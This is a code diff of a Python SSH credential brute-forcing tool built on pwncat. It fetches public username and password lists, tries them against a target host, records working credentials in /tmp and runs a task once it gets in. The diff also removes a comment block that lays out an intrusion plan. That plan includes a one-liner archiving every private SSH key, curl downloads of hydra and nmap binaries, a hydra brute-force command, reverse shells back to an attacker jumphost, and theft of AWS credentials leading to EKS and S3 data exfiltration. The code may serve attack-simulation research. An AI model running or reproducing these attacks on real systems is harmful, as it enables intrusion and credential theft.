@@ -44,7 +44,7 @@ parser.add_argument('--default-passwords-url', dest="default_passwords_url",
 parser.add_argument('--add-default-users', dest="add_default_users",
                     default=True, action=argparse.BooleanOptionalAction)
 parser.add_argument('--default-users-url', dest="default_users_url",
-                    default="https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt")
+                    default="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt")
 
 args = parser.parse_args()
 
@@ -267,23 +267,26 @@ def attempt_ssh_connection(user, credential, credential_type, target_ip, target_
             elif credential_type == 'identity':
                 session_args["identity"] = credential
 
-            print(f"attempting ssh conection: {user}:{credential}")
+            print(
+                f"attempting ssh conection: {user}:{credential}")
             session = manager.create_session(**session_args)
 
             # Correct file writing with encoding
-            with open('/tmp/found-users.txt', 'ab+') as f:
+            with open('/tmp/found-users.txt', 'a+') as f:
                 # Ensure bytes are written
-                f.write(f'{user}\n'.encode("utf-8"))
+                f.write(f'{user}\n')
             if credential_type == 'password':
-                with open('/tmp/found-passwords.txt', 'ab+') as f:
-                    f.write(f'{credential}\n'.encode("utf-8"))
-                with open('/tmp/found-user-passwords.txt', 'ab+') as f:
-                    f.write(f'{user}:{credential}\n'.encode("utf-8"))
+                with open('/tmp/found-passwords.txt', 'a+') as f:
+                    f.write(f'{credential}\n')
+                with open('/tmp/found-user-passwords.txt', 'a+') as f:
+                    f.write(
+                        f'{user}:{credential}\n')
             elif credential_type == 'identity':
-                with open('/tmp/found-identities.txt', 'ab+') as f:
-                    f.write(f'{credential}\n'.encode("utf-8"))
-                with open('/tmp/found-user-identities.txt', 'ab+') as f:
-                    f.write(f'{user}:{credential}\n'.encode("utf-8"))
+                with open('/tmp/found-identities.txt', 'a+') as f:
+                    f.write(f'{credential}\n')
+                with open('/tmp/found-user-identities.txt', 'a+') as f:
+                    f.write(
+                        f'{user}:{credential}\n')
 
             execute(session, task)  # Execute the specified task
             # Return True if connection and task execution were successful
@@ -321,156 +324,120 @@ def is_retryable_error(error):
         raise error
 
 
-# add interrupt handler for cleanup of lock file
-signal.signal(signal.SIGINT, signal_handler)
+if __name__ == '__main__':
+    # add interrupt handler for cleanup of lock file
+    signal.signal(signal.SIGINT, signal_handler)
 
-users = []
-passwords = []
-identities = []
-payload = args.payload
+    users = []
+    passwords = []
+    identities = []
+    payload = args.payload
 
-if args.user_list is not None and Path(args.user_list).exists():
-    with open(str(Path(args.user_list)), 'rb') as f:
-        users = f.read().splitlines()
-elif args.user is not None:
-    users.append(args.user)
+    if args.user_list is not None and Path(args.user_list).exists():
+        with open(str(Path(args.user_list)), 'r') as f:
+            users = f.read().splitlines()
+    elif args.user is not None:
+        users.append(args.user)
 
-if args.password_list is not None and Path(args.password_list).exists():
-    with open(str(Path(args.password_list)), 'rb') as f:
-        passwords = f.read().splitlines()
-elif args.password is not None:
-    passwords.append(args.password)
+    if args.password_list is not None and Path(args.password_list).exists():
+        with open(str(Path(args.password_list)), 'r') as f:
+            passwords = f.read().splitlines()
+    elif args.password is not None:
+        passwords.append(args.password)
 
-if args.identity_list is not None and Path(args.identity_list).exists():
-    with open(str(Path(args.identity_list)), 'rb') as f:
-        for i in f.read().splitlines():
-            identities.append(base64.b64decode(i))
-elif args.identity is not None:
-    identities.append(base64.b64decode(args.identity))
+    if args.identity_list is not None and Path(args.identity_list).exists():
+        with open(str(Path(args.identity_list)), 'r') as f:
+            for i in f.read().splitlines():
+                identities.append(base64.b64decode(i))
+    elif args.identity is not None:
+        identities.append(base64.b64decode(args.identity))
 
-# check for valid state
-if not len(users):
-    raise Exception("Either --user or --user-list are required")
+    # check for valid state
+    if not len(users):
+        raise Exception("Either --user or --user-list are required")
 
-if not len(passwords) and not len(identities):
-    raise Exception(
-        "One of --password, --identity, --password-list, or --identity-list are required")
+    if not len(passwords) and not len(identities):
+        raise Exception(
+            "One of --password, --identity, --password-list, or --identity-list are required")
 
-# reset found users
-Path("/tmp/found-users.txt").unlink(True)
-Path("/tmp/found-passwords.txt").unlink(True)
-Path("/tmp/found-user-passwords.txt").unlink(True)
-Path("/tmp/found-identities.txt").unlink(True)
-Path("/tmp/found-user-identities.txt").unlink(True)
+    # reset found users
+    Path("/tmp/found-users.txt").unlink(True)
+    Path("/tmp/found-passwords.txt").unlink(True)
+    Path("/tmp/found-user-passwords.txt").unlink(True)
+    Path("/tmp/found-identities.txt").unlink(True)
+    Path("/tmp/found-user-identities.txt").unlink(True)
 
-# append default passwords as required
-if args.add_default_passwords:
-    url = args.default_passwords_url
-    password_list = requests.get(url).content
-    passwords += password_list.splitlines()
+    # append default passwords as required
+    if args.add_default_passwords:
+        url = args.default_passwords_url
+        password_list = requests.get(url).content
+        passwords += password_list.splitlines()
 
-# append default users as required
-if args.add_default_users:
-    url = args.default_users_url
-    user_list = requests.get(url).content
-    users += user_list.splitlines()
+    # append default users as required
+    if args.add_default_users:
+        url = args.default_users_url
+        user_list = requests.get(url).content
+        users += user_list.splitlines()
 
-# enumerate users
-success = False
-max_retries = 3  # Maximum retry attempts
+    # enumerate users
+    success = False
+    max_retries = 3  # Maximum retry attempts
 
-session_lock = Path("/tmp/pwncat_connector_session.lock")
-session_lock.touch()
+    session_lock = Path("/tmp/pwncat_connector_session.lock")
+    session_lock.touch()
 
-try:
-    for credential_type in ["password", "identity"]:
-        for user in users:
-            credentials = passwords if credential_type == 'password' else identities
-            for credential in credentials:
-                retries = 0  # Retry counter
-                while retries < max_retries:
-                    success, retry, session = attempt_ssh_connection(
-                        user, credential, credential_type, args.target_ip, args.target_port, args.task)
-                    if success:
-                        print(
-                            f"Successful {credential_type} authentication: {user} with {credential}")
-                        break  # Exit the credential loop if a successful connection was made
-                    elif retry:
-                        retries += 1
-                        print(f"Attempt {retries} failed for {user}.")
-                        if retries < max_retries:
-                            print(f"Retrying... ({retries}/{max_retries})")
-                            # Sleep to avoid immediate reconnection
-                            time.sleep(retries*30)
-                        else:
+    try:
+        for credential_type in ["password", "identity"]:
+            for user in users:
+                credentials = passwords if credential_type == 'password' else identities
+                for credential in credentials:
+                    retries = 0  # Retry counter
+                    while retries < max_retries:
+                        success, retry, session = attempt_ssh_connection(
+                            user, credential, credential_type, args.target_ip, args.target_port, args.task)
+                        if success:
                             print(
-                                f"Maximum retries reached for {user} with {credential_type}.")
-                    else:
-                        # failed authentication - continue iterating username/credentials
-                        print(
-                            f"Failed {credential_type} authentication: {user} with {credential}")
-                        break
+                                f"Successful {credential_type} authentication: {user} with {credential}")
+                            break  # Exit the credential loop if a successful connection was made
+                        elif retry:
+                            retries += 1
+                            print(f"Attempt {retries} failed for {user}.")
+                            if retries < max_retries:
+                                print(f"Retrying... ({retries}/{max_retries})")
+                                # Sleep to avoid immediate reconnection
+                                time.sleep(retries*30)
+                            else:
+                                print(
+                                    f"Maximum retries reached for {user} with {credential_type}.")
+                        else:
+                            # failed authentication - continue iterating username/credentials
+                            print(
+                                f"Failed {credential_type} authentication: {user} with {credential}")
+                            break
+                    if success:
+                        break  # Exit the credential loop if a successful connection was made
                 if success:
-                    break  # Exit the credential loop if a successful connection was made
+                    break  # Exit the user loop if a successful connection was made
             if success:
-                break  # Exit the user loop if a successful connection was made
-        if success:
-            break  # Exit the credential_type loop if a successful connection was made
+                break  # Exit the credential_type loop if a successful connection was made
 
-except Exception as e:
-    print(f"exception: {e}")
-    pass
+    except Exception as e:
+        print(f"exception: {e}")
+        pass
 
-print("Backup pwncat_connector.log...")
-pwncat_log = Path("/tmp/pwncat_connector.log")
-if pwncat_log.exists():
-    dest_log = Path(
-        f"/tmp/{datetime.utcnow().strftime('%Y%m%d%H%M%S')}_pwncat_connector.log")
-    print(
-        f"Copying successful session log {pwncat_log.as_posix()} => {dest_log.as_posix()}")
-    session.log(
-        f"Copying session log {pwncat_log.as_posix()} => {dest_log.as_posix()}")
-    source = pwncat_log.read_bytes()
-    dest_log.write_bytes(source)
+    print("Backup pwncat_connector.log...")
+    pwncat_log = Path("/tmp/pwncat_connector.log")
+    if pwncat_log.exists():
+        dest_log = Path(
+            f"/tmp/pwncat_connector_{args.task}.log")
+        print(
+            f"Copying successful session log {pwncat_log.as_posix()} => {dest_log.as_posix()}")
+        session.log(
+            f"Copying session log {pwncat_log.as_posix()} => {dest_log.as_posix()}")
+        source = pwncat_log.read_bytes()
+        dest_log.write_bytes(source)
 
+    if session_lock.exists():
+        session_lock.unlink()
 
-if session_lock.exists():
-    session_lock.unlink()
-
-exit(0)
-
-# archive all private keys
-# rm /tmp/ssh_keys.tar /tmp/ssh_keys.tgz 2>/dev/null; for f in $(find  /home /root -name .ssh | xargs -I {} find {} -type f); do; if grep "PRIVATE" $f>/dev/null; then tar -rvf /tmp/ssh_keys.tar $f; fi done && gzip /tmp/ssh_keys.tar > /tmp/ssh_keys.tgz
-
-# now we need to:
-# - start an ssh session with this password to jumphost.attacker-hub.freedns.org (done)
-# - archive all of the private keys on the machine and copy to local (done)
-# - nmap script from jump host to discover ssh on kubeadmin (this will provide internal IP but we will use external access)
-# - hydra discovered host with failed user names and passwords
-# - LOCAL_NET=$(ip -o -f inet addr show | awk '/scope global/ {print $4}' | head -1)
-# - echo $LOCAL_NET > /tmp/hydra-targets.txt
-# - curl -LJ https://github.com/credibleforce/static-hydra/raw/main/binaries/linux/x86_64/hydra -o /tmp/hydra && chmod 755 /tmp/hydra
-# - /tmp/hydra -V -L /tmp/users.txt -P /tmp/passwords.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh
-# - curl -LJ https://github.com/credibleforce/static-binaries/raw/master/binaries/linux/x86_64/nmap -o /tmp/nmap && chmod 755 /tmp/nmap
-# - /tmp/nmap -sT --top-ports $LOCAL_NET
-# - archive all of the private keys on the machine and copy to local
-# - use ssh and identity to execute curl http://icanhazip.com
-# - use ssh and identity to execute reverse shell back to reverse shell - hand off using TASK
-
-# now we're in the reverse shell:
-# - reverse shell executes linpeas and pulls back aws credentials
-# - use credentials to call aws eks list-clusters and find our cluster
-# - use credentials to call aws eks update-kubeconfig --name=<cluster>
-# - copy kubeconfig back to attacker
-# - use local kubectl to execute eks discovery
-# - run general kubernetes discovery (e.g. pierates or https://github.com/corneliusweig/rakkess)
-# - discover s3app pod with directory listing and associated aws credentials
-# - list secrets to discovery BUCKET_NAME secret store
-# - update BUCKET_NAME value to point to prod
-# - proxy local connection to s3app to enumerate files
-# - download sensitive files
-# - ** optional **
-# - start privileged pod to mount node filesystem
-# - start second reverse shell with nmap and linpeas.sh from node
-# - exec into s3app to obtain a session for the role used in the pod
-# - abuse this as necessary
+    exit(0)
